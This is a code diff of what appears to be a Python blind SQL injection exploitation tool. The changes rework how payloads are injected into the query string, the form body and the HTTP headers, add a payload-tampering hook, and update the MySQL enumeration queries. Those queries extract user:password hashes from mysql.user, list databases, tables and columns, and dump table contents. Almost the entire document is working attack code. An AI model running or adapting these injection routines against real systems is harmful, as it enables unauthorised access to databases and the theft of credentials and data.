@@ -40,8 +40,9 @@ from functools import reduce
 from queue import Queue, Empty
 from time import localtime, strftime, sleep, time
 from threading import Thread
-from urllib.parse import urlparse, urlunparse
+from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode
 from string import Template
+from collections import OrderedDict
 import sys
 
 missing = []
@@ -68,11 +69,8 @@ def pprint_seconds(seconds, fmt):
 def T(s, **kwargs):
   return Template(s).safe_substitute(**kwargs)
 
-def substitute_payload(payload, *args):
-  new = []
-  for arg in args:
-    new.append(arg.replace('${injection}', payload))
-  return new
+def inject(payload, d):
+  return OrderedDict((k, v.replace('${injection}', payload)) for k, v in d.items())
 
 class Timing:
   def __enter__(self):
@@ -88,13 +86,14 @@ class Timing:
 class Requester_HTTP_Base(object):
 
   def __init__(self, response_processor, url, method='GET', body='', headers=[],
-      auth_type='basic', auth_creds='', proxies={}, ssl_cert='', encode_payload=lambda x: x,
+      auth_type='basic', auth_creds='', proxies={}, ssl_cert='', tamper_payload=lambda x: x,
       accepted_cookies=[], allow_redirects=False):
 
-    self.url = url
+    self.scheme, self.host, self.path, self.params, self.query, self.fragment = urlparse(url)
     self.method = method
-    self.body = body
-    self.headers = headers
+    self.query = OrderedDict(parse_qsl(self.query, True))
+    self.body = OrderedDict(parse_qsl(body, True))
+    self.headers = OrderedDict(h.split(': ', 1) for h in headers)
     self.auth_type = auth_type
     self.auth_creds = auth_creds
     self.proxies = proxies
@@ -103,7 +102,7 @@ class Requester_HTTP_Base(object):
     self.allow_redirects = allow_redirects
 
     self.response_processor = response_processor
-    self.encode_payload = encode_payload
+    self.tamper_payload = tamper_payload
 
   def review_response(self, payload, status_code, header_data, response_data, response_time, content_length):
     stats = '%s %d:%d %.3f' % (status_code, len(header_data+response_data), int(content_length), response_time)
@@ -150,25 +149,29 @@ class Requester_HTTP_requests(Requester_HTTP_Base):
     self.session.cookies.set_policy(CustomCookiePolicy(self.accepted_cookies))
 
   def test(self, payload):
-    url, method, body, headers = self.url, self.method, self.body, self.headers
+    scheme, host, path, params, query, fragment = self.scheme, self.host, self.path, self.params, self.query, self.fragment
+    method, body, headers = self.method, self.body, self.headers
 
-    url, body, headers = substitute_payload(self.encode_payload(payload), url, body, '\r\n'.join(headers))
+    payload = self.tamper_payload(payload)
 
-    headers = dict(h.split(': ', 1) for h in headers.split('\r\n') if h)
+    query = inject(payload, query)
+    body  = inject(payload, body)
+    headers = inject(payload, headers)
 
     if method.upper() == 'POST':
       headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
-    response = self.session.request(url=url, method=method, headers=headers, data=body, **self.request_kwargs)
+    url = urlunparse((scheme, host, path, params, None, fragment))
+    response = self.session.request(url=url, method=method, headers=headers, params=query, data=body, **self.request_kwargs)
 
-    header_data = '\r\n'.join('%s: %s' % (k, v) for k, v in response.headers.items())
+    response_headers = '\r\n'.join('%s: %s' % (k, v) for k, v in response.headers.items())
 
     if 'content-length' in response.headers:
       content_length = response.headers['content-length']
     else:
       content_length = -1
 
-    return self.review_response(payload, response.status_code, header_data, response.text, response.elapsed.total_seconds(), content_length)
+    return self.review_response(payload, response.status_code, response_headers, response.text, response.elapsed.total_seconds(), content_length)
 
 class Requester_HTTP_pycurl(Requester_HTTP_Base):
 
@@ -217,8 +220,10 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
 
   def test(self, payload):
 
-    url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert = \
-      self.url, self.method, self.body, self.headers, self.auth_type, self.auth_creds, self.proxies, self.ssl_cert
+    scheme, host, path, params, query, fragment = \
+      self.scheme, self.host, self.path, self.params, self.query, self.fragment
+    method, body, headers, auth_type, auth_creds, proxy, ssl_cert = \
+      self.method, self.body, self.headers, self.auth_type, self.auth_creds, self.proxies, self.ssl_cert
 
     def debug_func(t, s):
       s = s.decode(errors='ignore')
@@ -234,8 +239,11 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
     fp = self.fp
     fp.setopt(pycurl.DEBUGFUNCTION, debug_func)
 
-    scheme, host, path, params, query, fragment = urlparse(url)
-    query, body, headers = substitute_payload(self.encode_payload(payload), query, body, '\r\n'.join(headers))
+    payload = self.tamper_payload(payload)
+
+    headers = inject(payload, headers)
+    query = urlencode(inject(payload, query))
+    body = urlencode(inject(payload, body))
 
     method = method.upper()
     if method == 'GET':
@@ -254,7 +262,7 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
     url = urlunparse((scheme, host, path, params, query, fragment))
     
     fp.setopt(pycurl.URL, url)
-    fp.setopt(pycurl.HTTPHEADER, headers.split('\r\n'))
+    fp.setopt(pycurl.HTTPHEADER, ['%s: %s' % (k, v) for k, v in headers.items()])
     fp.perform()
 
     status_code = fp.getinfo(pycurl.HTTP_CODE)
@@ -779,11 +787,11 @@ class MySQL_Blind(SQLi_Base):
 
   def enum_passwords(self, user):
     if not user:
-      c = 'SELECT COUNT(DISTINCT(CONCAT_WS(0x3a,user,password))) FROM mysql.user'
-      q = 'SELECT DISTINCT(CONCAT_WS(0x3a,user,password)) FROM mysql.user LIMIT ${row_pos},1'
+      c = 'SELECT COUNT(DISTINCT(CONCAT_WS(CHAR(58),user,authentication_string))) FROM mysql.user'
+      q = 'SELECT DISTINCT(CONCAT_WS(CHAR(58),user,authentication_string)) FROM mysql.user LIMIT ${row_pos},1'
     else:
-      c = 'SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user="%s"' % user
-      q = 'SELECT DISTINCT(password) FROM mysql.user WHERE user="%s" LIMIT ${row_pos},1' % user
+      c = 'SELECT COUNT(DISTINCT(authentication_string)) FROM mysql.user WHERE user="%s"' % user
+      q = 'SELECT DISTINCT(authentication_string) FROM mysql.user WHERE user="%s" LIMIT ${row_pos},1' % user
     return c, q
 
   def enum_dbs(self):
@@ -798,7 +806,7 @@ class MySQL_Blind(SQLi_Base):
     else:
       c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema' \
           ' NOT IN ("information_schema","mysql","performance_schema")'
-      q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name) FROM information_schema.tables WHERE table_schema' \
+      q = 'SELECT CONCAT_WS(CHAR(58),table_schema,table_name) FROM information_schema.tables WHERE table_schema' \
           ' NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
     return c, q
 
@@ -809,10 +817,10 @@ class MySQL_Blind(SQLi_Base):
         q = 'SELECT column_name FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" LIMIT ${row_pos},1' % (db, table)
       else:
         c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema="%s"' % db
-        q = 'SELECT CONCAT_WS(0x3a,table_name,column_name) FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},1' % db
+        q = 'SELECT CONCAT_WS(CHAR(58),table_name,column_name) FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},1' % db
     else:
         c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")'
-        q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
+        q = 'SELECT CONCAT_WS(CHAR(58),table_schema,table_name,column_name) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
     return c, q
 
   def dump_table(self, db, table, cols):
@@ -820,7 +828,7 @@ class MySQL_Blind(SQLi_Base):
       raise NotImplementedError('-D, -T and -C required')
 
     c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
-    q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols.split(',')), db, table)
+    q = 'SELECT CONCAT_WS(CHAR(58),%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols.split(',')), db, table)
     return c, q
 
 # }}}
